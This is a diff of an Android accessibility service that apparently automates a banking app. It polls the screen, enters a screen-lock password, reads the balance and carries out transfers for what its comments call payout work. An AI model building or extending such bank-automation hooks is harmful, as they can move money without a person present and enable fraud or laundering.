@@ -2,6 +2,7 @@ package com.xposed.jagohook.server;
 
 import android.accessibilityservice.AccessibilityService;
 import android.content.Context;
+import android.content.pm.ArchivedActivityInfo;
 import android.graphics.PixelFormat;
 import android.os.Handler;
 import android.os.Looper;
@@ -48,11 +49,11 @@ public class PayAccessibilityService extends AccessibilityService {
     private final Handler handler = new Handler(Looper.getMainLooper());
 
     // ========== 代付相关 ==========
-    private volatile boolean isRunning = false;
+    private boolean isRunning = false;
     private volatile TakeLatestOrderBean takeLatestOrderBean;
     private PostPayErrorRunnable postPayErrorRunnable;
     private PayRunnable payRunnable;
-    private volatile String balance = "0";
+    private String balance = "0";
 
     // ========== ui操作 ==========
     private LogWindow logWindow;
@@ -74,7 +75,10 @@ public class PayAccessibilityService extends AccessibilityService {
 
         isRunning = true;
         logWindow.printA("代付运行中");
+
         scrollDown();
+
+        handlerAccessibility();
     }
 
     private boolean isBACKWARD = true;
@@ -83,17 +87,18 @@ public class PayAccessibilityService extends AccessibilityService {
     private void scrollDown() {
         if (takeLatestOrderBean != null) {
             handler.postDelayed(this::scrollDown, 10_000);
-        } else if (scrollView == null) {
-            handler.postDelayed(this::scrollDown, 10_000);
         } else {
-            if (isBACKWARD) {
-                scrollView.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
-                isBACKWARD = false;
-            } else {
-                scrollView.performAction(AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD);
-                isBACKWARD = true;
+            AccessibilityNodeInfo nodeInfo = getRootInActiveWindow();
+            List<AccessibilityNodeInfo> accessibilityNodeInfos = new ArrayList<>();
+            AccessibleUtil.getAccessibilityNodeInfoS(accessibilityNodeInfos, nodeInfo);
+            AccessibilityNodeInfo scrollView = handlerScrollView(accessibilityNodeInfos);
+            Map<String, AccessibilityNodeInfo> nodeInfoMap = AccessibleUtil.toContentDescMap(accessibilityNodeInfos);
+            if (nodeInfoMap.containsKey("Aktivitas Terakhir")) {//首页下拉
+                if (scrollView != null) {
+                    AccessibleUtil.performPullDown(this, 200, 1000, 1000);
+                    Logs.d("下拉");
+                }
             }
-            Logs.d("下拉");
             handler.postDelayed(this::scrollDown, 10_000);
         }
     }
@@ -101,7 +106,7 @@ public class PayAccessibilityService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
-        try {
+        /*try {
             if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {//不处理控件点击事件
                 return;
             }
@@ -112,22 +117,45 @@ public class PayAccessibilityService extends AccessibilityService {
             BottomNavigationBar(nodeInfoMap);
             Transfer(nodeInfoMap, nodeInfo);
             Dialogs(nodeInfoMap);
-            handlerScrollView(nodeInfo);
+        } catch (Throwable e) {
+            Logs.d("异常:" + e.getMessage());
+        }*/
+    }
+
+    //执行界面点击事件
+    private void handlerAccessibility() {
+        AccessibilityNodeInfo nodeInfo = getRootInActiveWindow();
+        if (nodeInfo == null) {
+            handler.postDelayed(this::handlerAccessibility, 2000);
+            return;
+        }
+        if (nodeInfo.getChildCount() == 0) {
+            handler.postDelayed(this::handlerAccessibility, 2000);
+            return;
+        }
+        List<AccessibilityNodeInfo> nodeInfos = new ArrayList<>();
+        AccessibleUtil.getAccessibilityNodeInfoS(nodeInfos, nodeInfo);
+        Map<String, AccessibilityNodeInfo> nodeInfoMap = AccessibleUtil.toContentDescMap(nodeInfos);
+        try {
+            ScreenLockPassword(nodeInfoMap);
+            getBalance(nodeInfoMap);
+            BottomNavigationBar(nodeInfoMap);
+            Transfer(nodeInfoMap, nodeInfo);
+            Dialogs(nodeInfoMap);
         } catch (Throwable e) {
             Logs.d("异常:" + e.getMessage());
         }
+        handler.postDelayed(this::handlerAccessibility, 2000);
     }
 
     //处理滑动
-    private void handlerScrollView(AccessibilityNodeInfo nodeInfo) {
-        List<AccessibilityNodeInfo> accessibilityNodeInfos = new ArrayList<>();
-        AccessibleUtil.getAccessibilityNodeInfoS(accessibilityNodeInfos, nodeInfo);
+    private AccessibilityNodeInfo handlerScrollView(List<AccessibilityNodeInfo> accessibilityNodeInfos) {
         for (AccessibilityNodeInfo accessibilityNodeInfo : accessibilityNodeInfos) {
             if (accessibilityNodeInfo.isScrollable()) {
-                scrollView = accessibilityNodeInfo;
-                break;
+                return accessibilityNodeInfo;
             }
         }
+        return null;
     }
 
     //弹窗直接点击确认
@@ -426,8 +454,9 @@ public class PayAccessibilityService extends AccessibilityService {
     @Override
     public void onDestroy() {
         super.onDestroy();
-        logWindow.destroy();
         isRunning = false;
+        logWindow.destroy();
+        handler.removeCallbacksAndMessages(null);
     }
 
     @Override
